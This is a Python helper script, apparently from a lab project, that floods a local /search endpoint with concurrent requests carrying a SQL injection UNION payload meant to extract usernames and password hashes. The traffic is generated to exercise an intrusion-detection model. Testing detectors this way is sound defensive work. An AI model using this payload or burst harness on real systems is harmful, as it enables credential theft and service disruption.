#!/usr/bin/env python3
"""Host-side burst against the published lab site (manual-demo helper).

This is volume, not a new exploit: many GETs to /search with a UNION payload
so Shaun v3 / HX-C can see an attack window. Use only on the local lab.

  python scripts/demo_attack_burst.py
  python scripts/demo_attack_burst.py --n 400 --concurrency 40
"""

from __future__ import annotations

import argparse
import concurrent.futures
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_Q = "' UNION SELECT username, password_hash FROM users--"


def one(url: str, timeout: float) -> str:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return f"{r.status}"
    except urllib.error.HTTPError as exc:
        return f"http-{exc.code}"
    except Exception as exc:
        return type(exc).__name__


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--base", default="http://127.0.0.1:8080")
    p.add_argument("--n", type=int, default=250)
    p.add_argument("--concurrency", type=int, default=25)
    p.add_argument("--timeout", type=float, default=3.0)
    p.add_argument(
        "--seconds",
        type=float,
        default=15.0,
        help="Keep issuing requests for this many seconds so the burst spans two 5s IDS windows",
    )
    args = p.parse_args()
    q = urllib.parse.quote(DEFAULT_Q)
    url = f"{args.base}/search?q={q}"
    t0 = time.time()
    print(f"burst n={args.n} conc={args.concurrency} seconds={args.seconds} -> {url}")
    ok = fail = 0

    def fire_batch(n: int) -> None:
        nonlocal ok, fail
        with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
            futs = [pool.submit(one, url, args.timeout) for _ in range(n)]
            for fut in concurrent.futures.as_completed(futs):
                status = fut.result()
                if status.startswith("20") or status.startswith("http-"):
                    ok += 1
                else:
                    fail += 1

    fire_batch(args.n)
    while args.seconds > 0 and (time.time() - t0) < args.seconds:
        fire_batch(max(args.concurrency, 20))
    print(f"done in {time.time()-t0:.1f}s  ok-ish={ok} fail/timeout={fail}")
    print("Watch Labs: first model with 2 consecutive windows P>=0.5 DROPs the host gateway.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
